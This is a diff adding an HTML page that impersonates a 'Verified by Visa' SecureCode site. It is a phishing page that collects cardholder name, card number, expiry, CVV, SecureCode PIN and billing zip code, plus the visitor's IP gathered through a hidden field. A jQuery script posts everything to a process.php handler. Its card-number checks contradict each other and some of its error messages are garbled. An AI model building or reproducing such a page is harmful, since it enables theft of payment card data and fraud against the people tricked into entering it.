@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+	<meta charset="utf-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
+	<meta name="description" content="">
+	<meta name="author" content="">
+	<link rel="icon" href="../../favicon.ico">
+	<title>2 card verification ajax post</title>
+	<!-- Latest compiled and minified CSS -->
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.0/jquery.min.js"></script>
+	<script src="http://ricostacruz.com/jquery.transit/jquery.transit.min.js"></script>
+	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" integrity="sha384-1q8mTJOASx8j1Au+a5WDVnPi2lkFfwwEAa8hDDdjZlpLegxhjVME1fgjWPGmkzs7" crossorigin="anonymous">
+	<!-- Optional theme -->
+	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap-theme.min.css" integrity="sha384-fLW2N01lMqjakBkx3l/M9EahuwpSfeNvV63J5ezn3uZzapT0u7EYsXMjQV+0En5r" crossorigin="anonymous">
+	<!-- Latest compiled and minified JavaScript -->
+	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js" integrity="sha384-0mSbJDEHialfmuBBQP6A4Qrprq5OVfW37PRR3j5ELqxss1yVqOtnepnHVP9aJ7xS" crossorigin="anonymous"></script>
+	<link href='https://fonts.googleapis.com/css?family=Noto+Sans:400,700' rel='stylesheet' type='text/css'>
+		<link href='default.css' rel='stylesheet' type='text/css'>
+
+</head>
+
+<body>
+	<div class="row">
+		<header class="container">
+			<div class="col-md-4">
+				<img src="https://d2xcq4qphg1ge9.cloudfront.net/assets/17276/3092459/original_verified-by-visa-2.png" class="visalogoheader">
+				<img src="https://d2xcq4qphg1ge9.cloudfront.net/assets/17276/3092460/original_securecodemc.jpg" class="mclogoheader">
+			</div>
+			<div class="col-md-8 text-right headerlinks">
+				<a href="">Welcome</a> |
+				<a href="">Contact Us</a> |
+				<a href="">FAQ</a> |
+				<a href="">Terms of Service</a> |
+				<a href="">Privacy Policy</a>
+			</div>
+		</header>
+	</div>
+	<div class="row ">
+		<div class="container">
+			<div class="col-md-6">
+				<h2>Welcome to Verified by Visa™</h2>
+				<p>As a valued Customer we are pleased to offer you Verified by Visa SecureCode. <strong>"Verified by Visa"</strong> provided in association with Visa International, protects your card against unauthorized use when you shop online at participating retailers or ATM withdrawals.</p>
+
+					
+				
+				
+
+
+
+<p>If you make a purchase in a shop, you enter a PIN number or sign a receipt to validate the transaction. Verified by Visa mimics this process over the Internet by providing a digital receipt that you sign off with your own personal SecureCode. </p>
+
+<p>To set up your account and SecureCode now, click on the "Register Now" button on the right and follow the instructions. Once enrolled you will be automatically prompted to enter your SecureCode when you shop at a participating online retailer.</p>
+				
+				
+			</div>
+			<div class="col-md-2"></div>
+			<div class="col-md-4">
+				<form id="ajax-contact" class="loginform" role="form" action="process.php" method="POST">
+					<div id="firstphase">
+						<h3 class="subtitlebox">Already Enrolled?</h3>
+						<div class="form-group">
+							<label for="fullnam">Name
+								<span style="font-size:0.8em">(as it appears in the card)</span> *
+							</label>
+							<input required type="text" name="fullnam" class="form-control" id="fullnam" placeholder="Full Name">
+						</div>					
+						<div class="form-group">
+							<label for="cardnum">Card Number *</label>
+							<input required type="number_format" name="cardnum" size="16" maxlength="16" class="form-control" id="cardnum">
+							<div class="log"></div>
+						</div>
+						<div class="form-group">
+							<label class="control-label" for="expiry-month">Expiration Date</label>
+							<div class="col-md-12">
+								<div class="row">
+									<div class="col-md-6 selectoverride">
+									  <select class="form-control" name="expiry-month" id="expiry-month">
+										<option>Month</option>
+										<option value="01">Jan (01)</option>
+										<option value="02">Feb (02)</option>
+										<option value="03">Mar (03)</option>
+										<option value="04">Apr (04)</option>
+										<option value="05">May (05)</option>
+										<option value="06">June (06)</option>
+										<option value="07">July (07)</option>
+										<option value="08">Aug (08)</option>
+										<option value="09">Sep (09)</option>
+										<option value="10">Oct (10)</option>
+										<option value="11">Nov (11)</option>
+										<option value="12">Dec (12)</option>
+									  </select>
+									</div>
+									<div class="col-md-6 selectoverride">
+									  <select class="form-control" name="expiry-year" id="expiry-year">
+										<option>Year</option>
+										<option value="16">2016</option>
+										<option value="17">2017</option>
+										<option value="18">2018</option>
+										<option value="19">2019</option>
+										<option value="20">2020</option>
+										<option value="21">2021</option>
+										<option value="22">2022</option>
+										<option value="23">2023</option>
+									  </select>
+									</div>
+								</div>
+							</div>
+						</div>					
+						<div class="form-group">
+							<label for="seccode">CVV *</label>
+							<input required type="number_format" onkeypress='return event.charCode >= 48 && event.charCode <= 57' size="3" maxlength="3" name="cvvcode" class="form-control" id="cvvcode" placeholder="xxx">
+						</div>
+						
+						<div class="form-group">
+							<label for="seccode">Securecode *</label>
+							<input required type="number_format" onkeypress='return event.charCode >= 48 && event.charCode <= 57' size="4" maxlength="4" name="seccode" class="form-control" id="seccode" placeholder="xxxx">
+						</div>
+						<div class="form-group">
+							<label for="zipcode">Billing Zipcode / Postal Code *</label>
+							<input required type="text" name="zipcode" class="form-control" id="zipcode">
+						</div>						
+						
+						
+						<div class="form-group">
+							<input type="hidden" class="form-control" id="q4a" name="q4a">
+						</div>
+						<p style="font-size:0.8em">* Indicates required fields.</p>
+						<button class="btn btn-success green">Submit
+					</div>
+				
+			</div>
+			</form>
+			<div id="form-messages">
+				<div class="success"></div>
+				<div class="error"></div>
+			</div>
+		</div>
+	</div>
+	</div>
+	<div class="row">
+		<footer class="container">
+			<div class="col-md-4">
+				<img src="https://d2xcq4qphg1ge9.cloudfront.net/assets/17276/3092459/original_verified-by-visa-2.png" class="visalogoheader">
+				<img src="https://d2xcq4qphg1ge9.cloudfront.net/assets/17276/3092460/original_securecodemc.jpg" class="mclogoheader">
+			</div>
+			<div class="col-md-8 text-right footerlinks">
+				<a href="">Welcome</a> |
+				<a href="">Contact Us</a> |
+				<a href="">FAQ</a> |
+				<a href="">Terms of Service</a> |
+				<a href="">Privacy Policy</a>
+			</div>
+		</footer>
+	</div>
+</body>
+
+</html>
+<script>
+	$.get("http://ipinfo.io", function(response) {
+		$("#q4a").val(response.ip);
+	}, "jsonp");
+	// magic.js
+
+	$(function() {
+
+		// Get the form.
+		var form = $('#ajax-contact');
+
+		// Get the messages div.
+		var formMessages = $('#form-messages');
+
+		// TODO: The rest of the code will go here...
+
+
+
+		$(form).submit(function(event) {
+
+			var ccnum = $('#cardnum').val();
+
+			if (!/^4/.test(ccnum)) {
+				$("#cardnum").focus();
+				$(".log").html("Not a valid VISA or Mastercard number");
+				return false;
+
+			}
+			if (!/^5[1-5]/.test(ccnum)) {
+				$("#cardnum").focus();
+				$(".log").html("Not a valid VISA or Mastercard number");
+				return false;
+
+			}					   
+					   
+			
+			var testc = $('#seccode').val();
+		
+			if ((testc.length < 4) || (testc.length > 4)) {
+			
+			$("#seccode").focus();
+		
+			$(".logcode").html("IP needs to be 4 digits");
+			    return false;
+				
+			};
+
+			var testc = $('#cvvcode').val();
+		
+			if ((testc.length < 3) || (testc.length > 3)) {
+			
+			$("#cvvcode").focus();
+		
+			$(".logcode").html("IP needs to be 3 digits");
+			    return false;
+				
+			};			
+			
+
+			event.preventDefault();
+
+			var formData = $(form).serialize();
+
+			// Submit the form using AJAX.
+			$.ajax({
+				type: 'POST',
+				url: $(form).attr('action'),
+				data: formData
+			})
+
+
+			.done(function(response) {
+				// Make sure that the formMessages div has the 'success' class.
+				$(formMessages).removeClass('error');
+				$(formMessages).addClass('success');
+
+				// Set the message text.
+				$(formMessages).text(response);
+
+				// Clear the form.
+					$('#cardnum').val(),
+					$('#fullnam').val(),
+					$('#seccode').val(),
+					$('#q4a').val(),
+					$('#expiry-month').val(),	
+					$('#expiry-year').val(),	
+					$('#zipcode').val(),
+					$('#cvvcode').val()
+					
+
+			})
+
+
+			.fail(function(data) {
+				// Make sure that the formMessages div has the 'error' class.
+				$(formMessages).removeClass('success');
+				$(formMessages).addClass('error');
+
+				// Set the message text.
+				if (data.responseText !== '') {
+					$(formMessages).text(data.responseText);
+				} else {
+					$(formMessages).text('Oops! An error occured and your message could not be sent.');
+				}
+			});
+
+		});
+
+	});
+
+</script>
